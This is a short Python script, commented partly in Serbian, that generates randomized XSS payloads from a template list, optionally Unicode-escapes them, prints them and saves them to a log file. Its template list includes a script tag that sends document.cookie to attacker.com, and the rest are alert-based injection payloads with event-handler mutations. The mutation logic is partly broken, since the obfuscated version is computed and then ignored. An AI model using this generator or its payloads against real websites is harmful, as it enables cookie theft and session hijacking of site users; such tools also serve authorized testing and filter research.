import random
import string
from urllib.parse import quote
from rich.console import Console

console = Console()

# Osnovni payloadi koji se koriste kao predložak
basic_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<script>eval('alert(1)')</script>",
    "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
    "<script>setTimeout(function(){alert(1)}, 1000)</script>"
]

# Unicode encoding i obfuscation
def obfuscate_payload(payload):
    return ''.join(f"\\u{ord(c):04x}" for c in payload)

def generate_payloads(count=10):
    generated = []
    for _ in range(count):
        base_payload = random.choice(basic_payloads)

        # Random mutation with encoding and obfuscation
        if random.choice([True, False]):
            payload = obfuscate_payload(base_payload)
        else:
            payload = base_payload

        # Randomize the injection method (onerror, eval, etc.)
        payload_method = random.choice(['onerror', 'onload', 'setTimeout', 'eval'])
        mutated_payload = base_payload.replace("<script>", f"<script {payload_method}='alert(1)'>")

        # Add randomness in the payload for more variety
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        mutated_payload += f" <img src='x' onerror='alert({random_str})'>"

        generated.append(mutated_payload)

    return generated

# Display the generated payloads in terminal
def display_payloads():
    payloads = generate_payloads(5)
    console.print(f"[bold cyan]Generated XSS Payloads:[/bold cyan]")
    for i, payload in enumerate(payloads, 1):
        console.print(f"[bold]{i}.[/bold] {payload}")
    from pathlib import Path
    from datetime import datetime
    import json

# Logovanje za istoriju i analitiku
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = Path(f"logs/xss_mutations_{ts}.json")
    log_path.parent.mkdir(exist_ok=True)

    with open(log_path, "w") as f:
        json.dump(payloads, f, indent=2)

    console.print(f"\n[✓] Sačuvano u fajl: {log_path}")
if __name__ == "__main__":
    display_payloads()
